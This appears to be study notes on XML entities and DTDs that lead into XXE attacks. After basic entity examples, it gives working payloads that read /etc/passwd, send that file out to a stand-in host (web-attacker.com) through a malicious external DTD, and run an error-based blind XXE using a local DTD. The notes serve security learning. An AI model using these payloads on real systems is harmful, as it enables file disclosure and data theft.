
XML entities
Think of XML entities as shortcuts or placeholders in an XML document. Instead of writing something directly, you use an entity to represent it.

| **Entity** | **What it Represents** | **Why it’s Needed**                |     |
| ---------- | ---------------------- | ---------------------------------- | --- |
| `&lt;`     | `<` (less than)        | `<` is used to open XML tags.      |     |
| `&gt;`     | `>` (greater than)     | `>` is used to close XML tags.     |     |
| `&amp;`    | `&` (ampersand)        | `&` is used for defining entities. |     |
| `&quot;`   | `"` (double quote)     | Used inside attribute values.      |     |
| `&apos;`   | `'` (single quote)     | Used inside attribute values.      |     |

```bash
<!DOCTYPE message [
    <!ENTITY greeting "Hello, World!">
]>
<message>
    &greeting;
</message>
```

A **DTD** is like a **rulebook** for an XML document. It defines:

1. **What tags can appear** in the XML.
2. **What kind of data** those tags can contain.
3. Any **entities** or **attributes** you want to use.

```bash

<!DOCTYPE note [
    <!ELEMENT note (to, from, message)>
    <!ELEMENT to (#PCDATA)>
    <!ELEMENT from (#PCDATA)>
    <!ELEMENT message (#PCDATA)>
]>
<note>
    <to>John</to>
    <from>Jane</from>
    <message>Hello!</message>
</note>


```

## **What is a DTD (Document Type Definition)?**

A **DTD** is like a **rulebook** for an XML document. It defines:

1. **What tags can appear** in the XML.
2. **What kind of data** those tags can contain.
3. Any **entities** or **attributes** you want to use.
 Think of it as blueprints for an XML file to make sure it’s written the right way.

**Types of DTD**

1. **Internal DTD**: Defined directly inside the XML file.
2. **External DTD**: Saved as a separate file and linked to the XML.
3. **Hybrid**: Combines internal and external definitions.

```bash

<!DOCTYPE note [
    <!ELEMENT note (to, from, message)>
    <!ELEMENT to (#PCDATA)>
    <!ELEMENT from (#PCDATA)>
    <!ELEMENT message (#PCDATA)>
]>
<note>
    <to>John</to>
    <from>Jane</from>
    <message>Hello!</message>
</note>


```

External DTD(note.dtd):
```bash
<!ELEMENT note (to, from, message)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT message (#PCDATA)>
```


XML File:
```bash

<!DOCTYPE note SYSTEM "note.dtd">
<note>
    <to>John</to>
    <from>Jane</from>
    <message>Hello!</message>
</note>


```



> [!NOTE] By misusing DTD and custom entities we create payload like this .
```bash
<!DOCTYPE data [
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>
&file;
</data>
```

##### What is Blind XXE?

Out-of-Band (OAST) Attacks:
```bash

<!DOCTYPE test [
    <!ENTITY xxe SYSTEM "http://attacker.com/malicious">
]>
<data>&xxe;</data>


```

**What Are XML Parameter Entities?**

**XML Parameter Entities** are a special kind of entity that:

1. Can **only be used inside the DTD (Document Type Definition)**.
2. Are declared with a `%` symbol before their name.
    - Example declaration:
    - ```bash
      <!ENTITY % myparameterentity "my parameter entity value">
      ```
Are referenced using % instead of the usual &.
```bash
%myparameterentity
```


```bash
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "http://attacker.com">
    %xxe;
]>
<data>Hello!</data>

```

1. The Attacker Creates a Malicious DTD
```bash
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```


```bash
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd">
    %xxe;
]>

```



```bash
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;


<!ENTITY % file SYSTEM "file:///etc/passwd">


<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">


<!ENTITY % exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>

```


blind XXE by repurposing a local DTD
```bash
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```